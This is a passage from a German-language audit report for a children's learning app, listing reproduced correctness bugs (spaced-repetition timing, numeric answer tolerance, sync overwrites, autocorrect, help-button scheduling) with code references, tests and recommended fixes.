- **Belege:** `src/domain/learning-box.ts:45-66` (ein Feld `lastReviewed` je Karte), `:375-381` (`recovering` prüft `card.lastReviewed`), `:400-432` (beide Zweige setzen `lastReviewed: now`); `app/components/learning-box-app.tsx:398-416` („Eine Karte kann in der Runde zweimal vorkommen (vorwärts und rückwärts)“); `src/storage/daily-plan.ts:77` (`occurredAt` für Fehler ebenfalls aus dem gemeinsamen Feld); `repro-g/g4-lernbox-plan.test.ts`: Beide Richtungen am 18.10. falsch; am 20.10. vorwärts richtig (→ Box 2), eine Minute später rückwärts richtig → `reverseBox` bleibt **1**. Gegenprobe ohne vorherige Vorwärtsabfrage → `reverseBox` **2**. Ausgabe: `{"forwardAfter":2,"reverseAfterBoth":1,"reverseAlone":2}`.
- **Betroffene:** alle LernBox-Nutzer mit Rückrichtung (ab Box 2 in der Portion), besonders Kinder mit vielen Fehlerkarten.
- **Folgen:** Richtig gelernte Vokabeln bleiben einen zusätzlichen Zyklus in Box 1; die Fehlerquote der Portion (max. 6) wird mit Karten belegt, die nicht mehr fehlerhaft sind; „Meine Fehler“ und „schwierig“ auf der Startseite zeigen Scheinfehler.
- **Empfehlung (Vorschlag zur Prüfung):** `lastReviewed` je Richtung führen (`reverseLastReviewed`) oder die Regel auf den Zeitpunkt des letzten **Fehlers dieser Richtung** stützen. Regressionstest wie oben; Migration: fehlendes Feld aus `lastReviewed` übernehmen.
- **Aufwand:** S
- **Erfolgskriterium:** Der Test ergibt `reverseAfterBoth = 2`; ein Eigenschaftstest „Abfragen der einen Richtung ändern das Ergebnis der anderen nicht“ ist grün.
- **Quelle:** `agent-g-korrektheit.md`

### G-006 – „1/3/7/14 Tage“ verschieben sich bei fester Übungszeit um einen Kalendertag (Lernwörter, Mathe), weil Fälligkeit auf die Minute gerechnet und die Portion einmal am Tag gebildet wird

- **Bereich:** Tagesportion, Fälligkeit, Zeitrechnung
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (reproduziert)
- **Gegenprüfung:** Empfehlung eingeschränkt (F, Teil 6.14): Umstellung mit Begrenzung zusätzlich fälliger Elemente; Puffer erst nach Beobachtung entfernen.
- **Beschreibung:** Die Portion entsteht beim ersten Öffnen des Tages und bleibt fest („Was im Laufe des Tages neu fällig wird, kommt erst morgen“). Lernwort- und Mathe-Fälligkeiten liegen exakt 24 h × Tage nach dem letzten Üben, auf die Minute. Übt ein Kind täglich zur selben Zeit (Zielbild: kurze Einheit zu Stundenbeginn), entsteht die Portion einige Minuten **vor** dem Fälligkeitszeitpunkt. Das Element fehlt in der heutigen Portion und erscheint erst morgen. Jeder Abstand wird so um einen Tag länger (1→2, 3→4, 7→8 …). Die LernBox hat dafür einen Puffer von 4 bzw. 12 Stunden, die beiden anderen Module nicht. Das ist eine weitere Ausprägung von A-004 (parallele Regeln) mit eigener, messbarer Folge. Zusätzlich zeigt die LernBox-Rückmeldung nach einem Fehler „kommt morgen wieder“, obwohl die Karte sofort fällig ist (`nextLabel`, `learning-box-app.tsx:166-171`, `Math.max(1, …)`).
- **Belege:** `src/domain/learning-word-progress.ts:53-55` (`now + Tage × 86 400 000`); `src/domain/math-practice.ts:212-218` (dito); `src/storage/daily-plan.ts:133-150` (`word.dueAt > now`, `review.dueAt > now` streng, ohne Puffer), `:197-227` (Portion einmal je Tag fest); zum Vergleich `src/domain/learning-box.ts:316-327` (`isLearningBoxCardDue` mit 4 bzw. 12 Stunden Puffer); `repro-g/g4-lernbox-plan.test.ts` (TZ=Europe/Berlin): Lernwort Montag 08:05 richtig → `dueAt` Donnerstag 08:05; Portion Donnerstag 08:00 → **nicht enthalten**, Freitag 08:00 → enthalten. LernBox gleicher Ablauf → Donnerstag enthalten. Mathe: Fehler 08:01, saubere Antwort 08:05 (neue Runde) → fällig Dienstag 08:05; Portion Dienstag 08:00 → **nicht enthalten**, Mittwoch → enthalten. Ausgabe: … (vollständig in `agent-g-korrektheit.md`)
- **Betroffene:** Kinder, die regelmäßig zur gleichen Zeit üben (Unterrichtsroutine); Lehrkräfte, die sich auf die dokumentierten Abstände verlassen.
- **Folgen:** Abstände sind systematisch länger als dokumentiert; an manchen Tagen ist die Portion kleiner oder leer („Heute ist nichts dran“), obwohl am selben Vormittag etwas fällig wird; Mathe und Lernwörter verhalten sich anders als die LernBox.
- **Empfehlung (Vorschlag zur Prüfung):** Fälligkeit als **lokaler Kalendertag** führen (`dueDay = localDayKey(now) + n Tage`) und in der Portion „fällig, wenn `dueDay ≤ heute`“ prüfen, für alle Module über eine gemeinsame Funktion (siehe A-004, A-013). Die LernBox-Puffer dann entfernen. Rückmeldetext nach Fehlern an den tatsächlichen Termin anpassen.
- **Aufwand:** M (inkl. Migration bestehender Zeitstempel)
- **Erfolgskriterium:** Der obige Test ergibt für alle drei Module „Donnerstag bzw. Dienstag enthalten“; Eigenschaftstest: Für jede Übungszeit t und jede Portionszeit am Tag `t + n` ist das Element enthalten.
- **Quelle:** `agent-g-korrektheit.md`

### G-007 – Tagesportion: Eine falsche Antwort zählt als „erledigt“; gelöschte Karten bleiben für immer offen und erzeugen eine Sackgasse

- **Bereich:** Tagesportion, Fortschrittsanzeige der Startseite
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (reproduziert) für die Fachlogik; bestätigt (Codeanalyse) für die Sackgasse in der Oberfläche
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** (1) Ein Element gilt als erledigt, sobald irgendein Ereignis vorliegt, auch ein falsches. Zwanzig falsche Antworten ergeben „20 von 20, Tagesziel geschafft“. Das ist im Umsetzungsplan so gewollt („wie oft geübt wurde, ist gleichgültig“), die Oberfläche nennt es aber Ziel und Erfolg, nicht „bearbeitet“. Die falsch beantworteten Elemente kommen erst morgen wieder (Plan fest). (2) Löscht das Kind eine Karte oder einen Stapel, die in der heutigen Portion stehen, bleibt das Element offen: Der Ring bleibt z. B. bei 19/20, „Weiterlernen“ führt in die LernBox, die meldet „Dein Teil für heute ist geschafft“, und zurück auf der Startseite ist wieder ein Element offen.
- **Belege:** `src/domain/daily-plan.ts:220-268` (`dailyPlanProgress`: jedes Ereignis erledigt, unabhängig vom Ergebnis; keine Prüfung, ob das Objekt noch existiert); `app/components/learning-box-app.tsx:155-164` (`buildPlanQueue` verwirft gelöschte Karten stillschweigend), `:276-279` und `:356-360` (leere Warteschlange → „Dein Teil für heute ist geschafft“); `app/lernen/learner-home.tsx:24-47` und `app/lernen/use-learner-dashboard.ts:72-91` (Ring `done/total`, „Weiterlernen“ führt zum ersten offenen … (vollständig in `agent-g-korrektheit.md`); `repro-g/g4-lernbox-plan.test.ts`: Portion mit einem Fehlerelement, ein falsches Ereignis → `{"done":1,"total":1}`; Portion mit Karte c1, Karte gelöscht → `total − done = 1` ohne Möglichkeit, ein Ereignis zu erzeugen. Oberflächenpfad per Codelesung (Zeilen oben).
- **Betroffene:** Kinder (Erfolgsmeldung trotz Fehlern; Endlosschleife „Weiterlernen“), Lehrkräfte und Eltern, die „Tagesziel geschafft“ als Lernerfolg lesen.
- **Folgen:** Die zentrale Fortschrittsanzeige misst Aktivität, nicht Können; ein Kind kann durch Raten „fertig“ werden. Gelöschte Inhalte verhindern dauerhaft (bis Mitternacht) den Abschluss und führen in eine Schleife.
- **Empfehlung (Vorschlag zur Prüfung):** Anzeige ehrlich benennen („20 bearbeitet, davon 14 richtig“) oder falsch beantwortete Elemente am Rundenende ein zweites Mal anbieten und erst dann als bearbeitet zählen. In `dailyPlanProgress` Elemente ohne existierendes Objekt als erledigt bzw. entfallen werten (Kartenliste übergeben), oder beim Löschen das Portionselement entfernen.
- **Aufwand:** S
- **Erfolgskriterium:** Test „Karte der Portion gelöscht → `total` sinkt oder Element erledigt“; die Startseite unterscheidet „bearbeitet“ und „richtig“.
- **Quelle:** `agent-g-korrektheit.md`

### G-008 – Zahlenprüfung: absolute Toleranz 0,01 wertet typische Kommafehler als richtig; Tausenderpunkt und Tausenderleerzeichen werten richtige Ergebnisse als falsch

- **Bereich:** Mathe-Antwortprüfung (Kopfrechnen inkl. eigener Aufgaben, Laufdiktat-Mathe live)
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (reproduziert)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Die Toleranz ist **absolut** 0,01 statt an die Stellen der Lösung gebunden. Bei Dezimalaufgaben (eigene Aufgaben im Kopfrechnen, Lehrer-Mathe im Laufdiktat, Klasse 5/6) gelten damit falsche Ergebnisse als richtig, gerade die typischen Stellenwertfehler. Umgekehrt werden Schreibweisen, die Kinder in der Schule lernen, als Fehler verbucht: „1.000“ ergibt die Zahl 1, „1 000“ ist keine Zahl. Beides speichert ein Fehlerereignis und legt einen Wiederholungsposten an. Kleinere Auffälligkeiten: Unicode-Minus „−3“ (so zeigt die App selbst Minus an) und „- 3“ sind falsch; „0x10“ und „1e1“ gelten als 16 bzw. 10.
- **Belege:** `src/domain/mental-math.ts:625-634` (`checkMentalMathAnswer`: `replace(",", ".")`, `Number(…)`, `Math.abs(…) < 0.01`); `src/integrations/laufdiktat/live-session.ts:80, 107-114` (`NUMERIC_TOLERANCE = 0.01`, gleiche Umwandlung); Aufrufer `src/storage/math-practice.ts:51-55`; `repro-g/g5-mathe.test.ts`: ``` checkMentalMathAnswer({answer: 0.01}, "0,001") → true (0,1 · 0,1: Kommafehler gilt als richtig; live ebenso "correct") checkMentalMathAnswer({answer: 0.025}, "0,02") → true; "0,03" → true checkMentalMathAnswer({answer: 3}, "2,995") → true checkMentalMathAnswer({answer: 1/3}, "0,34") → true; "1/3" → false checkMentalMathAnswer({answer: 1000}, "1.000") → false; "1 000" → false; ({answer: 1}, "1.000") → true … (vollständig in `agent-g-korrektheit.md`)
- **Betroffene:** Kinder mit Dezimal- und Größenaufgaben (Sek I, Klasse 4 Größen); Kinder im Zahlenraum bis 1 000 000; Lehrkräfte, die Fehlerlisten auswerten.
- **Folgen:** Fehlvorstellungen zur Kommaverschiebung werden bestätigt statt erkannt; richtige Ergebnisse mit Tausendertrennung werden zum „Fehler“, erzeugen Wiederholungen und verfälschen die Fehlerfamilien (D-009).
- **Empfehlung (Vorschlag zur Prüfung):** Exakten Dezimalvergleich verwenden: Eingabe nach Entfernen von Tausenderpunkten/-leerzeichen (nur in gültigen Dreiergruppen) und Ersetzen von „,“ und „−“ in eine Dezimalzahl umwandeln; Lösung auf ihre Nachkommastellen runden und exakt vergleichen. Für nicht abbrechende Ergebnisse (1/3) eine Bruchantwort zulassen oder die geforderte Rundung im Aufgabentext nennen. `Number()` durch einen strengen regulären Ausdruck ersetzen.
- **Aufwand:** S
- **Erfolgskriterium:** Tabellentest: „0,001“ für 0,01 falsch; „1.000“ und „1 000“ für 1000 richtig; „1.000“ für 1 falsch; „−3“ für −3 richtig.
- **Quelle:** `agent-g-korrektheit.md`

### G-009 – Lückenaufgaben mit Null sind mehrdeutig („0 · _ = 0“): jede andere richtige Zahl wird als Fehler gewertet

- **Bereich:** Mathe-Generator, Lückenmodus (Einmaleins, Division)
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (reproduziert)
- **Gegenprüfung:** Empfehlung eingeschränkt (F, Teil 6.13): Nulllücken nicht bilden statt jede passende Zahl akzeptieren.
- **Beschreibung:** Im Lückenmodus entstehen Aufgaben wie „0 · _ = 0“, „_ · 0 = 0“ oder „0 : _ = 0“. Jede Zahl (bei der Division jede von 0 verschiedene) ist eine richtige Lösung, akzeptiert wird nur der zufällig gezogene Faktor. Die richtige Antwort „0“ oder „1“ wird als Fehler gespeichert und erzeugt einen Wiederholungsposten in der Familie „Reihe n“.
- **Belege:** `src/domain/mental-math.ts:447-525` (`generateOperands`: Faktor 0…10, Null nur mit `excludeZeroOperand` ausgeschlossen), `:567-596` (`buildMentalMathTask`: eine einzige Lösung), `:598-623` (`generateMentalMathTasks`: Lückenposition zufällig); `app/frei/mathematics/mental-math-app.tsx:105-112` (Standard: Nullen erlaubt, Lückenposition „gemischt“); `repro-g/g5-mathe.test.ts` (20 050 Lückenaufgaben je Rechenart, Standard ohne Nullausschluss, Zahlenraum 100): Multiplikation **637 (3,2 %)** mehrdeutig, Beispiel „0 · _ = 0 (erwartet 6, auch richtig z. B. 0)“; Division **629 (3,1 %)**, Beispiel „0 : _ = 0 (erwartet 5, auch richtig z. B. 1)“; Addition/Subtraktion 0.
- **Betroffene:** Grundschulkinder beim Einmaleins mit Lücken; Kinder mit Rechenschwäche, die gerade die Nullregel verstanden haben.
- **Folgen:** Ein mathematisch richtiges Verständnis („jede Zahl mal 0 ist 0“) wird als falsch zurückgemeldet; das ist didaktisch besonders schädlich. Fehlerstatistik und Familienwiederholung werden verfälscht.
- **Empfehlung (Vorschlag zur Prüfung):** Im Lückenmodus keine Lücke an einer Stelle bilden, deren Wert durch eine Null nicht bestimmt ist (Generator neu ziehen), oder jede Zahl akzeptieren, die die Gleichung erfüllt (Gleichung mit der Eingabe auswerten statt mit `task.answer` vergleichen). Letzteres löst auch Lehrer-Lückenaufgaben im Laufdiktat.
- **Aufwand:** S
- **Erfolgskriterium:** Eigenschaftstest: Für jede erzeugte Lückenaufgabe gibt es genau eine ganze Zahl im Zahlenraum, die die Gleichung erfüllt – oder die Prüfung akzeptiert alle.
- **Quelle:** `agent-g-korrektheit.md`

### G-010 – Sicherung/Cloud-Abgleich: „neuerer Datensatz gewinnt“ überschreibt monotone Werte; eine bestandene Tastenwelt-Lektion wird wieder gesperrt, Bestwerte sinken

- **Bereich:** Persönliche Sicherung und Schüler-Cloud-Abgleich (Zusammenführung jenseits von B-001)
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (reproduziert)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Beim Einspielen einer Sicherung bzw. beim Cloud-Abgleich zweier Geräte gewinnt bei Tastenwelt- und Lernwort-Fortschritt der Datensatz mit dem jüngeren Übungszeitpunkt **vollständig**. Felder, die nur wachsen dürfen (`completed`, Bestwerte, Versuchszähler), werden dadurch zurückgesetzt. Das Ergebnis meldet „aktualisiert“, keinen Konflikt. Für Lernwörter ist „jüngster Stand gewinnt“ beim Box-Wert vertretbar, die Zähler (`attempts`, `incorrectAttempts`, `helpUses`) des anderen Geräts gehen aber verloren und widersprechen danach den zusammengeführten Ereignissen (vgl. A-003). LernBox-Karten werden dagegen vorsichtig behandelt (Konflikt statt Überschreiben), was A-003 beschreibt.
- **Belege:** `src/storage/personal-backup.ts:237-267` (`restorePersonalLearningBackup`: `learningWordProgress` und `typingProgress` werden als ganzer Datensatz ersetzt, wenn `lastPracticedAt` neuer ist); `src/integrations/cloud-sync/sync.ts:16-33` (Schüler-Abgleich = Sicherung hochladen + fremde Sicherung einspielen); `src/tastschreiben/typing-progress.ts:10-31` (`completed`, `bestWpm`, `bestAccuracy` sind monoton gedacht); `repro-g/g6-sicherung.test.ts` (zwei fake-indexeddb-Datenbanken): Gerät A „lesson-3“ `completed: true, bestWpm 18, bestAccuracy 96, attempts 4` (Mo); Gerät B `completed: false, bestWpm 9, bestAccuracy 80, attempts 1` (Di). B exportiert, A spielt ein → `{"updated":2,"conflicts":[]}`, A hat danach `completed: false, bestWpm 9, bestAccuracy 80, attempts 1`; Lernwort „Hund“ Box 4/5 Versuche → Box 1/1 Versuch. Rückweg A → B: `unchanged 2`, d. h. … (vollständig in `agent-g-korrektheit.md`)
- **Betroffene:** Kinder mit Schul- und Heimgerät oder Gerätewechsel, die den Cloud-Abgleich oder Sicherungsdateien nutzen.
- **Folgen:** Freigeschaltete Lektionen sind wieder gesperrt, Bestwerte und Medaillen sinken ohne Grund; Lernwort-Statistiken („x-mal falsch“, „Wiederholungen“) werden kleiner. Das Kind verliert sichtbar Erreichtes – demotivierend und für Lehrkräfte unerklärlich.
- **Empfehlung (Vorschlag zur Prüfung):** Feldweise zusammenführen: `completed = a || b`, Bestwerte `max`, Zähler als Summe nur über neue Ereignisse (besser: aus Ereignissen ableiten, A-003), `lastPracticedAt = max`, Box/Stufe vom jüngeren Stand. Eigenschaftstest „Zusammenführen ist kommutativ, idempotent und verringert keinen monotonen Wert“.
- **Aufwand:** S (Tastenwelt), M (Lernwörter mit Zählern)
- **Erfolgskriterium:** Der Test ergibt nach dem Abgleich `completed: true, bestWpm 18, bestAccuracy 96`; Kommutativitätstest grün.
- **Quelle:** `agent-g-korrektheit.md`

### G-011 – Fehler in der Unterrichtsrunde beschleunigen den LernBox-Aufstieg: „practice“/„reset“ machen die Karte fällig, ohne den Abrufzeitpunkt zu setzen

- **Bereich:** Laufdiktat → LernBox (Entscheidung 49), Leitner-Regeln „kein Aufstieg vor Fälligkeit“ und 8-Stunden-Regel
- **Schwere:** P2 (Prüfinstanz: P1)
- **Evidenzstatus:** bestätigt (reproduziert)
- **Gegenprüfung:** abgeschwächt (F, reproduziert): betrifft nur Karten, die schon in der LernBox liegen, und eine Leitner-Stufe. Trifft aber gerade Kinder mit Schreiberleichterung; mit G-005 gemeinsam beheben. Empfehlung angepasst: gemeinsam mit G-005 und erst nach tolerantem Lesen (Abrufzeit je Richtung ist eine Schemaänderung; Roadmap K13).
- **Beschreibung:** Entscheidung 49 will, dass Wörter mit Fehlversuchen im Unterricht „bald wieder geübt“ werden („Box bleibt, sofort fällig“ bzw. „Box 1, sofort fällig“). Technisch wird dafür nur `nextReview = jetzt` gesetzt. Damit fällt der Schutz „zu frühes Üben ist nur Üben“ weg, und weil `lastReviewed` nicht aktualisiert wird, greift auch die 8-Stunden-Regel nicht. Die erste richtige LernBox-Antwort nach der Stunde, auch zehn Minuten später, hebt die Karte deshalb **eine Box höher** als ohne Unterrichtsrunde. Ein Wort, das im Unterricht zweimal falsch war, verschwindet für 14 statt 5 Tage aus der Wiederholung. Nach einer Hilfe oder drei Fehlversuchen („reset“) landet es nach einer sofortigen richtigen Antwort in Box 2 (3 Tage). Derselbe Fehler direkt in der LernBox ergibt Box 1 (1 Tag). Die „ehrliche Kontrolle“ der Runde wirkt also umgekehrt.
- **Belege:** `src/domain/learning-box.ts:444-470` (`placeLiveVocabularyCard`: setzt nur `box/level/interval/nextReview`), `:352-397` (`processLearningBoxResult`: `early` hängt an `nextReview`, `recovering` an `lastReviewed` und nur an Box 1); `src/storage/personal-learning-events.ts:655-680` (Übernahme: `lastReviewed` bleibt alt, ohne Platzierung `nextReview: now`); `repro-g/g7-live-platzierung.test.ts`: Karte in Box 3, zuletzt vor 2 Tagen geübt (nächste Fälligkeit in 5 Tagen). Richtig nach 10 Minuten: `ohne Unterrichtsrunde → Box 3, nächste Fälligkeit 5 Tage (zu früh, kein Aufstieg) nach „practice“ (2 Fehler) → Box 4, 14 Tage nach „reset“ (Hilfe/≥3) → Box 2, 3 Tage Fehler direkt in der LernBox → Box 1, 1 Tag`
- **Betroffene:** alle Kinder, deren Lehrkraft Vokabel-Laufdiktate mit Übernahme nutzt (Standard „Nur Übungsbedarf übernehmen“); Kinder mit Schreiberleichterung (tolerierte Wörter sind immer „practice“).
- **Folgen:** Genau die Wörter, mit denen ein Kind im Unterricht Mühe hatte, steigen nach einer einzigen Sofortwiederholung schneller auf als sichere Wörter. Die Lehrkraft verlässt sich auf die Übernahme als Förderinstrument, die Wiederholung wird aber verkürzt.
- **Empfehlung (Vorschlag zur Prüfung):** Platzierung als echtes Ereignis behandeln: `lastReviewed = now` setzen (dann greift die 8-Stunden-Regel) und für „practice“ einen eigenen Zustand „Fehler offen“ führen, dessen nächste richtige Antwort den Fehler nur schließt (wie `recovering`), unabhängig von der Box. Alternativ „practice“ als Box − 1 platzieren. Regressionstest wie oben.
- **Aufwand:** S
- **Erfolgskriterium:** Im Test ergeben „practice“ und „reset“ nach 10 Minuten keinen Aufstieg; nach ≥ 8 Stunden genau eine Box.
- **Quelle:** `agent-g-korrektheit.md`

### G-012 – Laufdiktat → Wortspeicher übernimmt Satzanfänge großgeschrieben; die Einzelwortübung verlangt dann „Heute“ und wertet das richtige „heute“ als Fehler

- **Bereich:** Übernahme Laufdiktat → Wortspeicher (Plan 2.8, Entscheidung 49), Antwortprüfung Wortspeicher, Lernwort-Identität
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (reproduziert)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Wörter werden aus den Sätzen des Laufdiktats so übernommen, wie sie im Satz stehen. Satzanfänge sind großgeschrieben („Heute“, „Plötzlich“, „Leider“). Im Wortspeicher werden sie als Einzelwörter geübt, und die Prüfung verlangt die Großschreibung: Das orthografisch richtige „heute“ gilt als Groß-/Kleinfehler. Hat ein Kind im Diktat „heute“ am Satzanfang kleingeschrieben, wird zusätzlich „Heute“ als _Fehlerwort_ übernommen und sofort fällig gesetzt; geübt wird dann ein Wort, dessen Schreibung gar nicht das Problem war (Problem: Großschreibung am Satzanfang). Weil die Lernwort-ID die Groß-/Kleinschreibung ignoriert, teilen sich „essen/Essen“, „heute/Heute“ und „Weg/weg“ in eigenen bzw. übernommenen Wortboxen **einen** Lernstand; das Feld `word` wechselt mit jedem Versuch die Schreibung.
- **Belege:** `src/integrations/laufdiktat/word-store-transfer.ts:43-61` (`misspelledWords`: übernimmt `expected` wörtlich, auch „gross-klein“ am Satzanfang), `:67-98` (`buildWordStoreTransfer`: `wordsOf(tokenizeText(targetWord))` ohne Satzanfangsbehandlung); `src/storage/personal-learning-events.ts:1175-1232` (`importFromLesson`); `src/domain/text-compare.ts:224-252` (`compareGaps`: Groß-/Kleinabweichung = Fehler); `src/domain/learning-word-progress.ts:19-21` (`learningWordId` ohne Groß-/Kleinschreibung); `repro-g/g9-satzanfang.test.ts`: `misspelledWords("Heute gehen wir in den Zoo. Plötzlich regnet es.", "heute gehen … plözlich …")` → `["Heute","Plötzlich"]`; „Alle Wörter“ → `["Heute","gehen","Plötzlich","regnet"]`; `compareGaps(["Heute"],["heute"])` → `gross-klein`. `repro-g/g8-wortkey.test.ts`: „essen“ Box 3 → ein falscher Versuch mit „Essen“ → derselbe Datensatz `learning-word:essen`, `word: "Essen"`, Box 1. In den eingebauten Wortboxen gibt … (vollständig in `agent-g-korrektheit.md`)
- **Betroffene:** Kinder, deren Lehrkraft Text-Laufdiktate mit Übernahme in den Wortspeicher nutzt; Kinder mit eigenen Wortboxen.
- **Folgen:** Es wird eine falsche Einzelwortschreibung eingeübt und belohnt („Heute“), die richtige wird als Fehler zurückgemeldet; Fehlerwortlisten enthalten Scheinfehler; Lernstände unterschiedlicher Wörter vermischen sich.
- **Empfehlung (Vorschlag zur Prüfung):** Bei der Übernahme das erste Wort eines Satzes nur übernehmen, wenn es auch im Wortinneren eines Satzes großgeschrieben vorkommt oder in einem Wörterbuch/den Wortboxen als Nomen bekannt ist; sonst kleinschreiben oder (sicherer) Satzanfänge nicht übernehmen. Einen reinen Groß-/Kleinfehler am Satzanfang nicht als Wortfehler übernehmen, sondern als Satzregel zurückmelden. Lernwort-ID mit Groß-/Kleinschreibung bilden (Migration: bestehende IDs nach `word` aufspalten).
- **Aufwand:** S (Übernahme), M (ID-Migration)
- **Erfolgskriterium:** Der Test liefert keine Satzanfangswörter mit fälschlicher Großschreibung; „essen“ und „Essen“ haben getrennte Lernstände.
- **Quelle:** `agent-g-korrektheit.md`

### G-013 – Laufdiktat allein: Eingabefeld ohne `autocorrect="off"` – die iPad-Autokorrektur kann Rechtschreibfehler vor der Prüfung beheben

- **Bereich:** Laufdiktat allein (`/frei/german/laufdiktat`), Antwortprüfung
- **Schwere:** P2
- **Evidenzstatus:** begründetes Risiko (Codeanalyse; Verhalten der iPad-Autokorrektur nicht auf Gerät geprüft)
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Beschreibung:** Alle anderen Schreibfelder schalten Autokorrektur, Großschreibhilfe und Einfügen ab (Entscheidung 29). Das Feld des Laufdiktats allein nicht: Weder `autocorrect`/`autocapitalize` noch das Blockieren von Einfügen und Ersetzungen (`isBlockedRunningDictationInput`) sind gesetzt. Safari auf dem iPad korrigiert standardmäßig bekannte Falschschreibungen beim Leerzeichen; die Prüfung vergleicht anschließend die korrigierte Zeichenkette.
- **Belege:** `app/frei/german/laufdiktat/running-dictation-app.tsx:415-421` (nur `autoComplete="off"` und `spellCheck={false}`); zum Vergleich `src/domain/running-dictation-input.ts:1-6` (`STRICT_RUNNING_DICTATION_INPUT_ATTRIBUTES`, genutzt in Live-Raum, Wortspeicher, Textbox) und `app/views/lernbox/parts/study.tsx:147-149`; Codevergleich der Eingabeattribute (`grep -rn autoCorrect app`). Auf einem iPad: „Das Farad steht im Hof.“ tippen – erwartet Korrektur zu „Fahrrad“ (nicht ausgeführt, kein Gerät).
- **Betroffene:** Kinder, die das Laufdiktat zu Hause oder in Freiarbeit allein üben.
- **Folgen:** Rechtschreibfehler werden unsichtbar korrigiert und als richtig gewertet; Sterne und „geschafft“ messen die Autokorrektur.
- **Empfehlung (Vorschlag zur Prüfung):** `STRICT_RUNNING_DICTATION_INPUT_ATTRIBUTES` und die Einfüge-/Ersetzungssperre wie in den anderen Modulen verwenden; ein statischer Test, der alle Antwortfelder auf diese Attribute prüft.
- **Aufwand:** S
- **Erfolgskriterium:** Alle Antwortfelder tragen `autocorrect="off"`, `autocapitalize`, `spellcheck=false` und blockieren `insertReplacementText`.
- **Quelle:** `agent-g-korrektheit.md`

### G-014 – Kleinere Korrektheitsmängel (gesammelt)

- **Bereich:** verschiedene
- **Schwere:** P3
- **Evidenzstatus:** bestätigt (reproduziert) bzw. bestätigt (Codeanalyse), je Punkt angegeben
- **Gegenprüfung:** nicht gesondert geprüft (P2/P3)
- **Belege:** 1. **Division mit Rest nicht abbildbar** (reproduziert, `repro-g/g10-rest.test.ts`): `parseMentalMathTask("17 : 5")` erwartet `3,4`; „3 R 2“ ist falsch. In Klasse 3/4 ist „17 : 5 = 3 Rest 2“ die übliche Form. `src/domain/mental-math.ts:598-623, 625-634`. 2. **Unicode-Minus in Lehreraufgaben** (reproduziert): `mathTaskFromPrompt("8 − (−3)", "11")` wird zum „gemischten Ausdruck“ ohne Familie und ohne Varianten, weil der Operand nur `-?` (ASCII) zulässt. Die App zeigt Minus selbst als „−“ an. … (vollständig in `agent-g-korrektheit.md`)
- **Betroffene:** je Punkt Grundschulkinder (1), Lehrkräfte mit eigenen Aufgaben (2), Kinder nach Laufdiktaten (3), Kinder mit mehreren Tabs (4), alle LernBox-Nutzer (5).
- **Folgen:** Einzelne Scheinfehler oder falsche Einordnungen, jeweils ohne breite Wirkung.
- **Empfehlung (Vorschlag zur Prüfung):** (1) Antwortformat „q R r“ bei nicht aufgehender Division; (2) `−` im Operandenmuster zulassen; (3) beim Import `incorrectAttempts + 1`; (4) Karte in der Transaktion neu lesen und `processLearningBoxResult` dort anwenden; (5) Text „noch heute in ‚Meine Fehler‘, in der Portion morgen“.
- **Aufwand:** S je Punkt
- **Erfolgskriterium:** je ein Regressionstest pro Punkt. ---
- **Quelle:** `agent-g-korrektheit.md`

## F – Red Team (neue Befunde)

### F-001 – „Wort zeigen“ schützt den Lernstand besser als ein ehrlicher Versuch

- **Bereich:** Wortspeicher, Lernwort-Lernstand, Hilfe-Regel
- **Schwere:** P2
- **Evidenzstatus:** bestätigt (reproduziert)
- **Gegenprüfung:** neu (F, reproduziert); von der Hauptinstanz per Codelesung bestätigt: `learning-word-progress.ts:36-55` hält bei richtiger Antwort mit Hilfe die Box und setzt den vollen Abstand.
- **Beschreibung:** - _Konzept:_ Vault 06 verlangt „Hinweis oder Lösung verwendet → kein Aufstieg“. Für die Übernahme aus dem Unterricht legt dieselbe Notiz fest: „Abschreibvorlage (Lösung) angezeigt → Box 1, sofort fällig“. - _Implementierung:_ Im Wortspeicher hält „Wort zeigen“ die Box **und** verschiebt die nächste Wiederholung um 7, 14 oder 30 Tage. Ein ehrlicher Fehlversuch setzt dagegen auf Box 1, fällig morgen. Für ein unsicheres Kind ist es daher günstiger, sofort Hilfe zu holen, als es zu versuchen. Das Wort, das es nicht abrufen konnte, verschwindet für Wochen aus der Wiederholung. - Das ist derselbe Mechanismus wie D-001: Abschreiben mit sichtbarer Vorlage zählt als Lernfortschritt, hier in Form „kein Rückschritt plus volle Pause“.
- **Belege:** - `src/domain/learning-word-progress.ts:34-55` (`updateLearningWordProgress`): Mit `usedHelp` bleibt die Box, die Fälligkeit wird auf den **vollen Abstand der Box** gesetzt. - `src/domain/word-round.ts:183-192` (`applyHelp`), `:232-241` (`usedHelp` je Wort) - `app/views/wortspeicher/round-screen.tsx:141-145, 162-168`: Die Schaltfläche „Wort zeigen“ gibt es in Stufe 2–6; danach steht das Wort sichtbar über dem Eingabefeld. - `helpUses` wird gezählt (`learning-word-progress.ts:66`), aber … (vollständig in `agent-f-redteam.md`); `repro-f/f-001-help.test.ts`. Lernwort in Box 4, fällig, Stufe 4: `A Hilfe → richtig : Box 4, fällig in 14 d B falsch → richtig : Box 1, fällig in 1 d` In Box 5 ergibt Weg A nach Codelesung 30 Tage.
- **Betroffene:** - Kinder im Wortspeicher, besonders fehlerscheue und schwache Rechtschreiber, die bei Unsicherheit zur Hilfe greifen - Lehrkräfte und Eltern, die „sicher“ lesen
- **Folgen:** - **[H]** Die Wiederholung nicht abrufbarer Wörter fällt aus. - **[H]** Das System belohnt Fehlervermeidung statt Abrufversuch. Das widerspricht dem Prinzip Abrufübung, das D als Kern der Lernwirksamkeit bewertet. - Der Lernstand weicht von der plattformeigenen Live-Regel ab.
- **Empfehlung (Vorschlag zur Prüfung):** Hilfe wie die eigene Live-Regel behandeln: Box 1 (mindestens Box − 1), am nächsten Tag fällig, Merkstufe − 1. In derselben Änderung wie D-001 umsetzen, mit einer gemeinsamen Regeltabelle „Abrufnachweis“ (siehe A-004).
- **Aufwand:** S
